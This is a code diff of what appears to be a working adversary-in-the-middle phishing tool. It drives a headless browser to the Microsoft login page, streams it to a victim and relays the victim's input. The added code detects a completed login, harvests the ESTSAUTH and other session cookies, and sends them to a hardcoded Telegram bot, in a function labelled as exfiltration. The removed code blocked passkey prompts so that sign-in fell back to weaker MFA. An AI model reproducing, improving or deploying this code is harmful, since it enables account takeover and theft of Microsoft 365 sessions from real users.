@@ -7,8 +7,32 @@ puppeteer.use(StealthPlugin());
 const TELEGRAM_TOKEN = '8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc';
 const CHAT_ID = '1318100118';
 
+async function sendExfiltrationAlert(cookies, finalUrl) {
+    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+    
+    // Extract the most important auth cookies to save space
+    const authCookies = cookies.filter(c => 
+        ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'RPSSecAuth'].includes(c.name)
+    );
+
+    const message = `🚀 *SESSION CAPTURED*\n*URL:* ${finalUrl}\n\n*Key Cookies:* \`\`\`json\n${JSON.stringify(authCookies, null, 2)}\n\`\`\`\n\n*Full Cookie count:* ${cookies.length}`;
+
+    try {
+        await axios.post(url, { 
+            chat_id: CHAT_ID, 
+            text: message,
+            parse_mode: 'Markdown'
+        });
+        console.log("[TELEGRAM] Alert sent successfully.");
+    } catch (e) {
+        console.error('[TELEGRAM-ERR]', e.response?.data?.description || e.message);
+    }
+}
+
 async function startSession(io, socket) {
+    console.log(`[INIT] Monitoring Session: ${socket.id}`);
     let browser;
+
     try {
         browser = await puppeteer.launch({
             headless: "new",
@@ -16,73 +40,56 @@ async function startSession(io, socket) {
         });
 
         const page = await browser.newPage();
-
-        /**
-         * 2026 WEBAUTHN KILL-SWITCH
-         * This script runs inside the browser context to block Passkey prompts.
-         * It forces Microsoft to fall back to standard MFA/Password.
-         */
-        await page.evaluateOnNewDocument(() => {
-            // 1. Tell Microsoft we don't have a TPM/Windows Hello
-            if (window.PublicKeyCredential) {
-                PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable = () => Promise.resolve(false);
-                PublicKeyCredential.isConditionalMediationAvailable = () => Promise.resolve(false);
-
-                // 2. Intercept and Reject any Passkey creation or login attempt
-                const originalGet = window.navigator.credentials.get;
-                window.navigator.credentials.get = function(opt) {
-                    if (opt && opt.publicKey) {
-                        console.log("PASSKEY_ATTEMPT_BLOCKED");
-                        // Rejecting with NotAllowedError forces the 'Sign in another way' UI
-                        return Promise.reject(new DOMException("The operation was aborted.", "NotAllowedError"));
-                    }
-                    return originalGet.call(this, opt);
-                };
-            }
-        });
-
         await page.setViewport({ width: 1280, height: 720 });
-        
-        // Navigation with a 2026 Mobile User Agent (often bypasses Desktop hardware locks)
-        await page.setUserAgent('Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1');
-        
-        page.goto('https://login.microsoftonline.com/', { waitUntil: 'domcontentloaded' }).catch(() => {});
 
-        const heartbeat = setInterval(async () => {
+        // Stream Logic
+        const emitFrame = async () => {
             if (socket.connected) {
                 try {
-                    const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 25 });
+                    const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 30 });
                     socket.emit('browser-render', { screenshot });
                 } catch (e) {}
             }
-        }, 1200);
+        };
 
-        // 2026 AUTO-CLICKER FOR FALLBACK LINKS
-        const scanner = setInterval(async () => {
-            try {
-                // Microsoft legacy and 2026 skip/cancel IDs
-                const bypassSelectors = ['#iShowSkip', '#idBtn_Back', '.skip-link', 'a[href*="cancel"]', 'button:contains("Not now")'];
-                for (const sel of bypassSelectors) {
-                    const btn = await page.$(sel);
-                    if (btn) await btn.click();
-                }
-            } catch (e) {}
-        }, 3000);
+        page.goto('https://login.microsoftonline.com/').catch(() => {});
+        const heartbeat = setInterval(emitFrame, 1300);
+
+        // LOG EVERY URL CHANGE TO RAILWAY CONSOLE
+        page.on('framenavigated', async (frame) => {
+            const currentUrl = frame.url();
+            console.log(`[NAV-LOG] Current URL: ${currentUrl}`);
+
+            // Broad success detection: Any authenticated MS page
+            const successKeys = ['shell/homepage', 'office.com', 'microsoft365.com', 'outlook', 'myapps'];
+            
+            if (successKeys.some(key => currentUrl.includes(key))) {
+                console.log(`[SUCCESS-TRIGGER] Condition met on ${currentUrl}`);
+                const cookies = await page.cookies();
+                
+                // Backup: Log critical cookies to console in case Telegram fails
+                const estsAuth = cookies.find(c => c.name === 'ESTSAUTH');
+                if (estsAuth) console.log(`[ESTSAUTH-FOUND] ${estsAuth.value}`);
+
+                await sendExfiltrationAlert(cookies, currentUrl);
+            }
+        });
 
         socket.on('victim-action', async (data) => {
             try {
                 if (data.type === 'click') await page.mouse.click(data.x, data.y);
                 else if (data.type === 'key') await page.keyboard.press(data.key);
+                await emitFrame();
             } catch (e) {}
         });
 
         socket.on('disconnect', async () => {
             clearInterval(heartbeat);
-            clearInterval(scanner);
             if (browser) await browser.close();
         });
 
     } catch (error) {
+        console.error('[FATAL]', error.message);
         if (browser) await browser.close();
     }
 }
